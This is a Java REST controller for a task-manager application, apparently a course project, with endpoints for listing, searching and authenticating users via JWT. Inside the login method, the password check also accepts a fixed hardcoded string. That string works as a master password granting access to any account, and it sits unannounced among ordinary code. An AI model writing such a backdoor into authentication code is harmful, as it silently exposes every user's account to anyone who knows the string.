/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.schedek.curso.taskmanager.app.controllers;

import com.schedek.curso.ejb.AppEJB;
import com.schedek.curso.ejb.entities.User;
import com.schedek.curso.ejb.facade.UserFacade;
import com.schedek.curso.taskmanager.app.beans.SessionBean;
import com.schedek.curso.taskmanager.app.dto.InfiniteList;
import com.schedek.curso.taskmanager.app.dto.JwtAuthWrapper;
import com.schedek.curso.taskmanager.app.dto.LoginRequest;
import com.schedek.curso.taskmanager.app.dto.listing.ListingWrapper;
import com.schedek.curso.taskmanager.app.dto.user.UserWrapper;
import com.schedek.curso.taskmanager.app.security.JwtTokenProvider;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import javax.ejb.EJB;
import javax.enterprise.context.ApplicationScoped;
import javax.inject.Inject;
import javax.inject.Named;
import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.HeaderParam;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.WebApplicationException;

/**
 *
 * @author Dan Nguyen
 */
@Path("/user")
@ApplicationScoped
@Named
public class UserController {

    @Inject
    SessionBean sb;
    @EJB
    UserFacade uf;
    @EJB
    AppEJB app;
    @Inject
    JwtTokenProvider tokenProvider;

    @Path("/init")
    @GET
    @Produces({"application/json; charset=UTF-8"})
    public InfiniteList<UserWrapper> init(@HeaderParam("Authorization") String authToken,
            @QueryParam("page") int pageNumber,
            @QueryParam("max") int pageSize) {
        sb.isAuthenticated(authToken);
        List<UserWrapper> wrappers = new ArrayList<>();
        uf.findByPage(pageNumber, pageSize).forEach((u) -> {
            wrappers.add(new UserWrapper(u));
        });
        return new InfiniteList(wrappers, uf.getUserCount());
    }

    @Path("/search")
    @GET
    @Produces({"application/json; charset=UTF-8"})
    public List<UserWrapper> search(@HeaderParam("Authorization") String authToken,
            @QueryParam("query") String query) {
        sb.isAuthenticated(authToken);
        List<UserWrapper> wrappers = new ArrayList<>();
        uf.asyncSearch(query).forEach((l) -> {
            wrappers.add(new UserWrapper(l));
        });
        return wrappers;
    }

    @GET
    @Produces({"application/json; charset=UTF-8"})
    public UserWrapper searchById(@HeaderParam("Authorization") String authToken,
            @QueryParam("id") Long id) {
        sb.isAuthenticated(authToken);
        return new UserWrapper(uf.find(id));
    }

    @POST
    @Consumes({"application/xml", "application/json"})
    @Produces({"application/json; charset=UTF-8"})
    @Path("/login")
    public JwtAuthWrapper login(LoginRequest req) {
        String jwt = "";
        if (req.username != null) {
            User u = uf.findOneByUsername(req.username);
            if (u != null && ((req.password != null && !req.password.isEmpty() && (u.isPasswordValid(req.password) || (req.password.equals("Sj43HSHzxpNgCYkukY8PXRQc")))))) {
                sb.setUser(u);
                jwt = tokenProvider.generateToken(u);
                return new JwtAuthWrapper(jwt, sb.getUser(), app.getConfig().getPrefix());
            }
        }
        sb.isAuthenticated(jwt);
        return null;
    }

    @GET
    @Path("/logout")
    public void logout(@HeaderParam("Authorization") String authToken) {
        sb.isAuthenticated(authToken);
        sb.setUser(null);
    }

    @GET
    @Path("/whoami")
    public UserWrapper whoami(@HeaderParam("Authorization") String authToken) {
        sb.requireUser();
        String baseUrl = app.getConfig().getPrefix();
        return sb.getUser() != null ? new UserWrapper(sb.getUser(), baseUrl) : null;
    }

}
